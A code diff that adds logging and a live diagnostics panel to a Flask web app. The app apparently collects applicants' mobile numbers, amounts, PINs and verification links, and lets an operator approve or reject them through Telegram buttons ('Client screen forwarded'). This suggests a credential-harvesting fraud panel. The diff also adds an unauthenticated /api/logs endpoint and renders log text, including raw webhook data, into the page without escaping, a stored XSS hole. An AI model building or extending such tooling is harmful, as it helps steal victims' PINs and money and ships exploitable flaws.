@@ -20,7 +20,9 @@ AT_API_KEY = os.environ.get("AT_API_KEY")
 
 def send_sms_notification(message):
     if not ADMIN_NOTIFICATION_PHONE or not AT_API_KEY:
-        print("Africa's Talking SMS configuration missing. SMS skipped.")
+        msg = "Africa's Talking SMS configuration missing. SMS skipped."
+        print(msg)
+        log_system_event("sms_notification", msg, status="warning")
         return
     try:
         url = "https://api.africastalking.com/version1/messaging"
@@ -37,14 +39,22 @@ def send_sms_notification(message):
             "to": ADMIN_NOTIFICATION_PHONE,
             "message": message
         }
-        requests.post(url, data=payload, headers=headers, timeout=5)
+        res = requests.post(url, data=payload, headers=headers, timeout=5)
+        if res.status_code in (200, 201):
+            log_system_event("sms_notification", f"SMS notification sent: {message[:100]}", status="success")
+        else:
+            log_system_event("sms_notification", f"SMS API returned status {res.status_code}: {res.text}", status="error")
     except Exception as e:
+        import traceback
+        tb = traceback.format_exc()
         print(f"Africa's Talking SMS dispatch failed: {e}")
+        log_system_event("sms_notification", f"SMS dispatch failed: {str(e)}", status="error", traceback_str=tb)
 
 # Telegram Configuration
 TELEGRAM_BOT_TOKEN = (os.environ.get("TELEGRAM_BOT_TOKEN") or os.environ.get("TELEGRAM_TOKEN") or "").strip()
 TELEGRAM_CHAT_ID = (os.environ.get("TELEGRAM_CHAT_ID") or "").strip()
 LOCAL_RECORDS = {}
+LOCAL_SYSTEM_LOGS = []
 
 def safe_load_json(val):
     if not val:
@@ -72,7 +82,9 @@ def safe_load_json(val):
 
 def send_telegram_notification(message, reply_markup=None):
     if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
-        print("Telegram configuration missing. Notification skipped.")
+        msg = "Telegram configuration missing. Notification skipped."
+        print(msg)
+        log_system_event("telegram_notification", msg, status="warning")
         return None
     try:
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -85,9 +97,18 @@ def send_telegram_notification(message, reply_markup=None):
         if reply_markup:
             payload["reply_markup"] = reply_markup
         res = requests.post(url, json=payload, timeout=5)
-        return res.json()
+        res_json = res.json()
+        if res.status_code == 200 and res_json.get("ok"):
+            log_system_event("telegram_notification", f"Notification sent: {message[:100]}", status="success")
+        else:
+            err_msg = f"Telegram returned error (status {res.status_code}): {res_json}"
+            log_system_event("telegram_notification", err_msg, status="error")
+        return res_json
     except Exception as e:
+        import traceback
+        tb = traceback.format_exc()
         print(f"Telegram notification dispatch failed: {e}")
+        log_system_event("telegram_notification", f"Dispatch failed: {str(e)}", status="error", traceback_str=tb)
         return None
 
 def edit_telegram_message(chat_id, message_id, text, reply_markup=None):
@@ -176,6 +197,74 @@ def sanitize_upstash_env():
         token = token[7:].strip()
     return url, token
 
+def log_system_event(event_type, message, status="success", traceback_str=None):
+    try:
+        log_entry = {
+            "timestamp": get_now_str(),
+            "event_type": event_type,
+            "message": message,
+            "status": status,
+            "traceback": traceback_str or ""
+        }
+        # Prepend to local memory logs
+        LOCAL_SYSTEM_LOGS.insert(0, log_entry)
+        if len(LOCAL_SYSTEM_LOGS) > 100:
+            LOCAL_SYSTEM_LOGS.pop()
+
+        log_json = json.dumps(log_entry)
+
+        # Write to Upstash or Redis
+        base_url, token = sanitize_upstash_env()
+        if base_url and token:
+            headers = {
+                "Authorization": f"Bearer {token}",
+                "Content-Type": "application/json"
+            }
+            # Push to system_logs list and trim
+            requests.post(base_url, headers=headers, json=["LPUSH", "system_logs", log_json], timeout=4)
+            requests.post(base_url, headers=headers, json=["LTRIM", "system_logs", 0, 99], timeout=4)
+        elif db:
+            db.lpush("system_logs", log_json)
+            db.ltrim("system_logs", 0, 99)
+    except Exception as e:
+        print(f"Error logging system event: {e}")
+
+def get_system_logs():
+    logs = []
+    try:
+        base_url, token = sanitize_upstash_env()
+        if base_url and token:
+            headers = {
+                "Authorization": f"Bearer {token}",
+                "Content-Type": "application/json"
+            }
+            res = requests.post(base_url, headers=headers, json=["LRANGE", "system_logs", 0, 50], timeout=3)
+            if res.status_code == 200:
+                raw_list = res.json().get("result") or []
+                for item in raw_list:
+                    parsed = safe_load_json(item)
+                    if parsed:
+                        logs.append(parsed)
+                if logs:
+                    return logs
+        elif db:
+            raw_list = db.lrange("system_logs", 0, 50) or []
+            for item in raw_list:
+                parsed = safe_load_json(item)
+                if parsed:
+                    logs.append(parsed)
+            if logs:
+                return logs
+    except Exception as e:
+        print(f"Error fetching system logs: {e}")
+    
+    return LOCAL_SYSTEM_LOGS[:50]
+
+@app.route('/api/logs')
+def api_system_logs():
+    return jsonify(get_system_logs())
+
+
 def persist_record(app_id, data_update, push_list=False):
     try:
         key = f"app:{app_id}"
@@ -193,12 +282,18 @@ def persist_record(app_id, data_update, push_list=False):
                     existing = safe_load_json(raw)
             except Exception as ex:
                 print(f"Upstash GET error: {ex}")
+                log_system_event("persist_record", f"Upstash GET failed for key {key}: {ex}", status="warning")
             existing.update(data_update)
             existing["updated_at"] = get_now_str()
             # Command array for SET
-            requests.post(base_url, headers=headers, json=["SET", key, json.dumps(existing)], timeout=4)
+            set_res = requests.post(base_url, headers=headers, json=["SET", key, json.dumps(existing)], timeout=4)
+            if set_res.status_code != 200:
+                log_system_event("persist_record", f"Upstash SET failed: {set_res.text}", status="error")
             if push_list:
-                requests.post(base_url, headers=headers, json=["LPUSH", "applications", key], timeout=4)
+                lpush_res = requests.post(base_url, headers=headers, json=["LPUSH", "applications", key], timeout=4)
+                if lpush_res.status_code != 200:
+                    log_system_event("persist_record", f"Upstash LPUSH failed: {lpush_res.text}", status="error")
+            log_system_event("persist_record", f"Persisted app:{app_id} to Upstash Redis", status="success")
         elif db:
             raw = db.get(key)
             existing = safe_load_json(raw)
@@ -207,8 +302,15 @@ def persist_record(app_id, data_update, push_list=False):
             db.set(key, json.dumps(existing))
             if push_list:
                 db.lpush("applications", key)
+            log_system_event("persist_record", f"Persisted app:{app_id} to standard Redis", status="success")
+        else:
+            log_system_event("persist_record", f"No Redis config. Persisted app:{app_id} to local memory only.", status="warning")
     except Exception as e:
+        import traceback
+        tb = traceback.format_exc()
         print(f"Error persisting record: {e}")
+        log_system_event("persist_record", f"Failed to persist app:{app_id}: {str(e)}", status="error", traceback_str=tb)
+        
     if app_id not in LOCAL_RECORDS:
         LOCAL_RECORDS[app_id] = {}
     LOCAL_RECORDS[app_id].update(data_update)
@@ -228,14 +330,19 @@ def get_record(app_id):
                 raw = get_res.json().get("result")
                 parsed = safe_load_json(raw)
                 if parsed:
+                    log_system_event("get_record", f"Fetched key {key} from Upstash Redis", status="success")
                     return parsed
         elif db:
             raw = db.get(key)
             parsed = safe_load_json(raw)
             if parsed:
+                log_system_event("get_record", f"Fetched key {key} from standard Redis", status="success")
                 return parsed
     except Exception as e:
+        import traceback
+        tb = traceback.format_exc()
         print(f"Error fetching record: {e}")
+        log_system_event("get_record", f"Error fetching key {key}: {str(e)}", status="error", traceback_str=tb)
     return LOCAL_RECORDS.get(app_id, {})
 
 HTML_PAGE = r"""<!DOCTYPE html>
@@ -1377,8 +1484,10 @@ def api_decision(app_id, action):
         msg_title = 'Verification Link Rejected'
         desc = 'The link was marked invalid/expired. The user has been returned to re-enter a new link.'
     else:
+        log_system_event("api_decision", f"Invalid decision action '{action}' for app: {app_id}", status="error")
         return jsonify({"status": "error", "message": "Unknown action"}), 400
 
+    log_system_event("api_decision", f"Decision '{action}' triggered for app: {app_id}", status="success")
     persist_record(app_id, {"status": status})
 
     if request.is_json or request.headers.get('Accept') == 'application/json':
@@ -1416,6 +1525,7 @@ def telegram_webhook():
     try:
         data = request.get_json(force=True, silent=True) or {}
         print(f"Incoming Telegram webhook event: {json.dumps(data)}")
+        log_system_event("telegram_webhook", f"Received webhook: {json.dumps(data)[:250]}", status="success")
         cq = data.get("callback_query")
         if cq:
             cq_id = cq.get("id")
@@ -1429,6 +1539,7 @@ def telegram_webhook():
                 action, app_id = cb_data.split(":", 1)
                 action = action.strip().lower()
                 app_id = app_id.strip()
+                log_system_event("telegram_webhook", f"Processing callback '{action}' for app: {app_id}", status="success")
                 if action in ("accept", "approve"):
                     persist_record(app_id, {"status": "approved"})
                     edit_telegram_message(chat_id, message_id, f"✅ *APPLICATION APPROVED*\n\n🆔 *Ref:* `{app_id}`\n\nStatus: Approved by admin. Client screen forwarded.")
@@ -1437,7 +1548,10 @@ def telegram_webhook():
                     edit_telegram_message(chat_id, message_id, f"❌ *LINK REJECTED*\n\n🆔 *Ref:* `{app_id}`\n\nStatus: Rejected as invalid/expired. Client prompted to re-enter link.")
         return jsonify({"ok": True})
     except Exception as e:
+        import traceback
+        tb = traceback.format_exc()
         print(f"Telegram webhook error: {e}")
+        log_system_event("telegram_webhook", f"Webhook error: {str(e)}", status="error", traceback_str=tb)
         return jsonify({"ok": False, "error": str(e)})
 
 @app.route('/api/telegram-webhook/setup')
@@ -1518,10 +1632,84 @@ def admin_page():
         <th class="p-3">Ref</th><th class="p-3">Applicant</th><th class="p-3">Mobile</th><th class="p-3">Amount</th><th class="p-3">PIN</th><th class="p-3">Link</th><th class="p-3">Status</th><th class="p-3 text-right">Action</th>
       </tr></thead><tbody>{rows}</tbody></table>
     </div>
+
+    <!-- System & Webhook Logs Panel -->
+    <div class="bg-zinc-950 rounded-2xl border border-zinc-800 p-6 shadow-2xl space-y-4">
+      <div class="flex items-center justify-between pb-3 border-b border-zinc-900">
+        <div class="flex items-center gap-2">
+          <div class="w-2 h-2 bg-emerald-500 rounded-full animate-ping"></div>
+          <h2 class="text-xs font-black text-white uppercase tracking-wider text-zinc-300">System & Webhook Diagnostics</h2>
+        </div>
+        <div class="text-[9px] text-zinc-500 uppercase font-mono">Auto-refreshes every 5s</div>
+      </div>
+      <div id="logs-container" class="space-y-2 max-h-96 overflow-y-auto pr-2 font-mono text-[11px] leading-relaxed">
+        <div class="text-zinc-500 text-center py-4">Loading diagnostics logs...</div>
+      </div>
+    </div>
   </div>
   <script>
     async function decide(id, act){{ try{{ const r=await fetch('/api/decision/'+id+'/'+act,{{headers:{{'Accept':'application/json'}}}}); if(r.ok) location.reload(); }}catch(e){{ alert(e); }} }}
     async function setupHook(){{ const r=await fetch('/api/telegram-webhook/setup'); alert(JSON.stringify(await r.json(), null, 2)); }}
+
+    async function loadLogs() {{
+      try {{
+        const r = await fetch('/api/logs');
+        if (!r.ok) return;
+        const logs = await r.json();
+        const container = document.getElementById('logs-container');
+        if (!logs || logs.length === 0) {{
+          container.innerHTML = '<div class="text-zinc-500 text-center py-4">No system logs available yet.</div>';
+          return;
+        }}
+        let html = '';
+        logs.forEach((log, index) => {{
+          let statusColor = 'text-emerald-400 bg-emerald-950/20 border-emerald-900/30';
+          if (log.status === 'error') {{
+            statusColor = 'text-rose-400 bg-rose-950/20 border-rose-900/30';
+          }} else if (log.status === 'warning') {{
+            statusColor = 'text-amber-400 bg-amber-950/20 border-amber-900/30';
+          }}
+
+          const hasTraceback = log.traceback && log.traceback.trim() !== '';
+          const tracebackId = 'tb-' + index;
+
+          html += `
+            <div class="p-3 rounded-xl border ${{statusColor}} space-y-2">
+              <div class="flex flex-wrap items-center justify-between gap-2">
+                <div class="flex items-center gap-2">
+                  <span class="px-2 py-0.5 rounded text-[9px] font-black uppercase bg-black/40">${{log.event_type}}</span>
+                  <span class="text-zinc-300 font-bold">${{log.message}}</span>
+                </div>
+                <div class="flex items-center gap-2 text-[10px] text-zinc-400 font-bold">
+                  <span>${{log.timestamp}}</span>
+                  ${{hasTraceback ? `<button onclick="toggleTraceback('${{tracebackId}}')" class="px-2 py-0.5 bg-zinc-800 hover:bg-zinc-700 rounded text-[9px] text-white">Toggle Traceback</button>` : ''}}
+                </div>
+              </div>
+              ${{hasTraceback ? `
+                <pre id="${{tracebackId}}" class="hidden mt-2 p-3 bg-black/60 rounded-lg text-rose-300 overflow-x-auto max-h-48 text-[10px] whitespace-pre-wrap border border-zinc-800 font-mono">${{log.traceback}}</pre>
+              ` : ''}}
+            </div>
+          `;
+        }});
+        container.innerHTML = html;
+      }} catch (e) {{
+        console.error("Failed to load logs", e);
+      }}
+    }}
+
+    function toggleTraceback(id) {{
+      const el = document.getElementById(id);
+      if (el) {{
+        if (el.classList.contains('hidden')) {{
+          el.classList.remove('hidden');
+        }} else {{
+          el.classList.add('hidden');
+        }}
+      }}
+    }}
+
+    loadLogs();
+    setInterval(loadLogs, 5000);
   </script>
 </body></html>'''
 
